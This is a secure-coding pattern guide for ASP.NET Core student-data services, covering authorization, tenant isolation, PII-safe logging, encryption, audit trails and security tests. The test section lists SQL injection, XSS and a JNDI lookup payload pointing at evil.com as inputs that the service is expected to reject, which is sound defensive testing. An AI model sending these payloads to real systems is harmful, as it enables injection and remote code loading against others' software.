# .NET/ASP.NET Core Patterns

> EdTech-compliant patterns for .NET development

---

## Authentication & Authorization

### Pattern: Secure Controller with Student Data Access

```csharp
[ApiController]
[Route("api/[controller]")]
[Authorize(Policy = "TeacherOrAdmin")]
public class StudentsController : ControllerBase
{
    private readonly IStudentService _studentService;
    private readonly IAuthorizationService _authorizationService;
    private readonly IAuditService _auditService;

    public StudentsController(
        IStudentService studentService,
        IAuthorizationService authorizationService,
        IAuditService auditService)
    {
        _studentService = studentService;
        _authorizationService = authorizationService;
        _auditService = auditService;
    }

    [HttpGet("{studentId}")]
    [AuditLog(DataType = "STUDENT_PII", Action = "READ")]
    public async Task<ActionResult<StudentDto>> GetStudent(string studentId)
    {
        var user = User;

        // Verify user can access THIS specific student
        var authResult = await _authorizationService
            .AuthorizeAsync(user, studentId, "CanAccessStudent");

        if (!authResult.Succeeded)
        {
            await _auditService.LogUnauthorizedAccessAsync(user, studentId);
            return Forbid();
        }

        var student = await _studentService.GetByIdAsync(studentId);
        if (student == null)
        {
            return NotFound(new { message = "Resource not found" });
        }

        return Ok(student.ToDto()); // Never return entity directly
    }
}
```

**Why:** Defense in depth - policy check + specific resource authorization + audit logging.

---

## Data Access

### Pattern: Parameterized Queries (MANDATORY)

```csharp
// GOOD - Parameterized query with Entity Framework
public async Task<Student?> GetByEmailAsync(string email)
{
    return await _context.Students
        .FirstOrDefaultAsync(s => s.Email == email);
}

// GOOD - Raw SQL with parameters
public async Task<List<Student>> SearchAsync(string searchTerm)
{
    return await _context.Students
        .FromSqlInterpolated($"SELECT * FROM Students WHERE Name LIKE {searchTerm + "%"}")
        .ToListAsync();
}

// BAD - NEVER concatenate user input
// var sql = $"SELECT * FROM Students WHERE Email = '{email}'";  // SQL INJECTION!
```

### Pattern: Repository with Tenant Isolation

```csharp
public interface IStudentRepository
{
    Task<Student?> GetByIdAndSchoolAsync(long id, long schoolId);
    Task<List<Student>> GetBySchoolAsync(long schoolId);
}

public class StudentRepository : IStudentRepository
{
    private readonly ApplicationDbContext _context;
    private readonly ICurrentUserService _currentUser;

    public StudentRepository(
        ApplicationDbContext context,
        ICurrentUserService currentUser)
    {
        _context = context;
        _currentUser = currentUser;
    }

    // Always filter by school - prevents cross-tenant access
    public async Task<Student?> GetByIdAndSchoolAsync(long id, long schoolId)
    {
        return await _context.Students
            .Where(s => s.Id == id && s.SchoolId == schoolId)
            .FirstOrDefaultAsync();
    }

    // Automatically scope to current user's school
    public async Task<List<Student>> GetBySchoolAsync(long schoolId)
    {
        // Additional authorization check
        if (!_currentUser.CanAccessSchool(schoolId))
        {
            throw new UnauthorizedAccessException("Access denied to school");
        }

        return await _context.Students
            .Where(s => s.SchoolId == schoolId)
            .ToListAsync();
    }
}
```

**Why:** Tenant isolation prevents IDOR (Insecure Direct Object Reference) attacks.

---

## Logging

### Pattern: Safe Logging (No PII)

```csharp
public class StudentService : IStudentService
{
    private readonly ILogger<StudentService> _logger;

    public async Task<Student> ProcessEnrollmentAsync(EnrollmentRequest request)
    {
        // GOOD - Log action, not PII
        _logger.LogInformation(
            "Processing enrollment for school: {SchoolId}, grade: {Grade}",
            request.SchoolId,
            request.Grade);

        // BAD - NEVER log student PII
        // _logger.LogInformation("Enrolling student: {Name}", request.StudentName);  // FERPA violation!
        // _logger.LogInformation("Student email: {Email}", request.Email);  // PII leak!

        // If you must reference a student, use masked ID
        _logger.LogDebug(
            "Processing student reference: {MaskedId}",
            MaskStudentId(request.StudentId));

        return await EnrollStudentAsync(request);
    }

    private static string MaskStudentId(string id)
    {
        if (string.IsNullOrEmpty(id) || id.Length < 4)
            return "***";
        return $"***{id[^4..]}";
    }
}
```

---

## DTOs and Data Transfer

### Pattern: Never Expose Entities

```csharp
// Entity - internal only
public class Student
{
    public long Id { get; set; }

    [PersonalData]
    [Encrypted]
    public string Ssn { get; set; } = string.Empty;  // Sensitive!

    public string FirstName { get; set; } = string.Empty;
    public string LastName { get; set; } = string.Empty;
    public string Email { get; set; } = string.Empty;
    public DateTime DateOfBirth { get; set; }

    public virtual ICollection<Grade> Grades { get; set; } = new List<Grade>();
    public virtual ICollection<DisciplinaryRecord> DisciplinaryRecords { get; set; } = new List<DisciplinaryRecord>();
}

// DTO - what the API returns
public record StudentDto(
    long Id,
    string FirstName,
    string LastName,
    string Email,
    int GradeLevel
    // Note: NO ssn, NO disciplinaryRecords, NO full grade history
);

// Extension method for mapping
public static class StudentExtensions
{
    public static StudentDto ToDto(this Student student)
    {
        return new StudentDto(
            student.Id,
            student.FirstName,
            student.LastName,
            student.Email,
            student.CurrentGradeLevel
        );
    }
}
```

**Why:** DTOs control exactly what data leaves your service. Entities may have sensitive fields.

---

## Error Handling

### Pattern: Safe Error Responses

```csharp
public class GlobalExceptionHandler : IExceptionHandler
{
    private readonly ILogger<GlobalExceptionHandler> _logger;

    public GlobalExceptionHandler(ILogger<GlobalExceptionHandler> logger)
    {
        _logger = logger;
    }

    public async ValueTask<bool> TryHandleAsync(
        HttpContext httpContext,
        Exception exception,
        CancellationToken cancellationToken)
    {
        var (statusCode, message) = exception switch
        {
            StudentNotFoundException => (404, "Resource not found"),
            UnauthorizedAccessException => (403, "Access denied"),
            ValidationException ve => (400, ve.Message),
            _ => (500, "An unexpected error occurred. Please contact support.")
        };

        // Log the real error internally
        _logger.LogError(exception, "Error processing request");

        // Return generic message to user
        httpContext.Response.StatusCode = statusCode;
        await httpContext.Response.WriteAsJsonAsync(new
        {
            error = message,
            code = statusCode switch
            {
                404 => "NOT_FOUND",
                403 => "FORBIDDEN",
                400 => "BAD_REQUEST",
                _ => "INTERNAL_ERROR"
            }
        }, cancellationToken);

        return true;
    }
}

// NEVER return: exception.Message, exception.StackTrace, or detailed errors
```

---

## Validation

### Pattern: Input Validation with FluentValidation

```csharp
public record CreateStudentRequest(
    string FirstName,
    string LastName,
    string Email,
    int GradeLevel,
    long SchoolId
);

public class CreateStudentValidator : AbstractValidator<CreateStudentRequest>
{
    public CreateStudentValidator()
    {
        RuleFor(x => x.FirstName)
            .NotEmpty().WithMessage("First name is required")
            .MaximumLength(100).WithMessage("First name too long")
            .Matches(@"^[a-zA-Z\s\-']+$").WithMessage("Invalid characters in name");

        RuleFor(x => x.LastName)
            .NotEmpty().WithMessage("Last name is required")
            .MaximumLength(100).WithMessage("Last name too long");

        RuleFor(x => x.Email)
            .NotEmpty().WithMessage("Email is required")
            .EmailAddress().WithMessage("Invalid email format");

        RuleFor(x => x.GradeLevel)
            .InclusiveBetween(-1, 12).WithMessage("Invalid grade level");  // -1 = Pre-K

        RuleFor(x => x.SchoolId)
            .NotEmpty().WithMessage("School ID is required");
    }
}

// In controller
[HttpPost]
public async Task<ActionResult<StudentDto>> CreateStudent(
    [FromBody] CreateStudentRequest request)
{
    // FluentValidation runs automatically via filter

    // Additional business validation
    if (!await _authorizationService.CanCreateStudentInSchoolAsync(User, request.SchoolId))
    {
        return Forbid();
    }

    var student = await _studentService.CreateAsync(request);
    return CreatedAtAction(nameof(GetStudent), new { studentId = student.Id }, student.ToDto());
}
```

---

## Encryption

### Pattern: Field-Level Encryption with Data Protection

```csharp
public class Student
{
    public long Id { get; set; }

    // Encrypted at rest
    [Encrypted]
    public string Ssn { get; set; } = string.Empty;

    [Encrypted]
    public string? MedicalInfo { get; set; }

    // Not encrypted - not PII
    public int GradeLevel { get; set; }
}

// Custom value converter for encryption
public class EncryptedStringConverter : ValueConverter<string, string>
{
    public EncryptedStringConverter(IDataProtector protector)
        : base(
            v => protector.Protect(v),
            v => protector.Unprotect(v))
    {
    }
}

// In DbContext configuration
protected override void OnModelCreating(ModelBuilder modelBuilder)
{
    var protector = _dataProtectionProvider
        .CreateProtector("StudentData.v1");

    modelBuilder.Entity<Student>()
        .Property(s => s.Ssn)
        .HasConversion(new EncryptedStringConverter(protector));
}
```

---

## Audit Logging

### Pattern: Audit Trail for Student Data

```csharp
[AttributeUsage(AttributeTargets.Method)]
public class AuditLogAttribute : ActionFilterAttribute
{
    public string DataType { get; set; } = string.Empty;
    public string Action { get; set; } = "ACCESS";

    public override async Task OnActionExecutionAsync(
        ActionExecutingContext context,
        ActionExecutionDelegate next)
    {
        var auditService = context.HttpContext.RequestServices
            .GetRequiredService<IAuditService>();
        var user = context.HttpContext.User;

        var entry = new AuditEntry
        {
            UserId = user.FindFirstValue(ClaimTypes.NameIdentifier) ?? "anonymous",
            Action = Action,
            DataType = DataType,
            Timestamp = DateTime.UtcNow,
            Method = context.ActionDescriptor.DisplayName,
            Success = false
        };

        try
        {
            var result = await next();
            entry.Success = result.Exception == null;

            if (result.Exception != null)
            {
                entry.ErrorMessage = result.Exception.GetType().Name;
            }
        }
        finally
        {
            await auditService.SaveAsync(entry);
        }
    }
}

// Usage
[HttpGet("{studentId}")]
[AuditLog(DataType = "STUDENT_PII", Action = "READ")]
public async Task<ActionResult<StudentDto>> GetStudent(string studentId)
{
    // ...
}
```

---

## Authorization Policies

### Pattern: Custom Authorization Handler

```csharp
// Requirement
public class CanAccessStudentRequirement : IAuthorizationRequirement { }

// Handler
public class CanAccessStudentHandler
    : AuthorizationHandler<CanAccessStudentRequirement, string>
{
    private readonly IStudentService _studentService;

    public CanAccessStudentHandler(IStudentService studentService)
    {
        _studentService = studentService;
    }

    protected override async Task HandleRequirementAsync(
        AuthorizationHandlerContext context,
        CanAccessStudentRequirement requirement,
        string studentId)
    {
        var user = context.User;
        var userSchoolId = user.FindFirstValue("school_id");

        // Admin can access all
        if (user.IsInRole("Admin"))
        {
            context.Succeed(requirement);
            return;
        }

        // Teachers can only access students in their school
        var student = await _studentService.GetByIdAsync(studentId);
        if (student != null && student.SchoolId.ToString() == userSchoolId)
        {
            context.Succeed(requirement);
        }
    }
}

// Registration in Program.cs
builder.Services.AddAuthorization(options =>
{
    options.AddPolicy("CanAccessStudent", policy =>
        policy.Requirements.Add(new CanAccessStudentRequirement()));

    options.AddPolicy("TeacherOrAdmin", policy =>
        policy.RequireRole("Teacher", "Admin"));
});

builder.Services.AddScoped<IAuthorizationHandler, CanAccessStudentHandler>();
```

---

## Testing

### Pattern: Security Tests

```csharp
public class StudentsControllerSecurityTests : IClassFixture<WebApplicationFactory<Program>>
{
    private readonly WebApplicationFactory<Program> _factory;
    private readonly HttpClient _client;

    public StudentsControllerSecurityTests(WebApplicationFactory<Program> factory)
    {
        _factory = factory;
        _client = factory.CreateClient();
    }

    [Fact]
    public async Task GetStudent_WithoutAuth_Returns401()
    {
        var response = await _client.GetAsync("/api/students/1");
        Assert.Equal(HttpStatusCode.Unauthorized, response.StatusCode);
    }

    [Fact]
    public async Task GetStudent_CrossSchoolAccess_Returns403()
    {
        // Arrange - Teacher from school 1 trying to access student from school 2
        var client = _factory.CreateClientWithAuth(schoolId: 1, role: "Teacher");

        var response = await client.GetAsync("/api/students/999");  // Student in school 2

        Assert.Equal(HttpStatusCode.Forbidden, response.StatusCode);
    }

    [Fact]
    public async Task GetStudent_NotFound_DoesNotLeakPii()
    {
        var client = _factory.CreateClientWithAuth(schoolId: 1, role: "Teacher");

        var response = await client.GetAsync("/api/students/99999");
        var content = await response.Content.ReadAsStringAsync();

        Assert.Equal(HttpStatusCode.NotFound, response.StatusCode);
        Assert.DoesNotContain("@", content);  // No email
        Assert.DoesNotContain("student", content.ToLower());  // Generic message
    }

    [Theory]
    [InlineData("'; DROP TABLE Students; --")]
    [InlineData("<script>alert('xss')</script>")]
    [InlineData("${jndi:ldap://evil.com/a}")]
    public async Task Search_WithMaliciousInput_ReturnsBadRequest(string maliciousInput)
    {
        var client = _factory.CreateClientWithAuth(schoolId: 1, role: "Teacher");

        var response = await client.GetAsync($"/api/students?search={Uri.EscapeDataString(maliciousInput)}");

        Assert.Equal(HttpStatusCode.BadRequest, response.StatusCode);
    }
}
```

---

## Quick Reference

| Task | Pattern |
|------|---------|
| Authenticate | `[Authorize(Policy = "...")]` + custom policies |
| Authorize specific resource | `IAuthorizationService.AuthorizeAsync` with handler |
| Query with tenant isolation | Filter by `SchoolId` in repository |
| Log safely | Never log PII, use structured logging |
| Return data | Use DTOs/records, never entities |
| Handle errors | `IExceptionHandler` with generic messages |
| Encrypt sensitive data | `IDataProtectionProvider` with value converter |
| Audit access | `[AuditLog(DataType = "STUDENT_PII")]` |
| Validate input | FluentValidation with automatic filter |

---

*"Make it work, make it right, make it secure."*
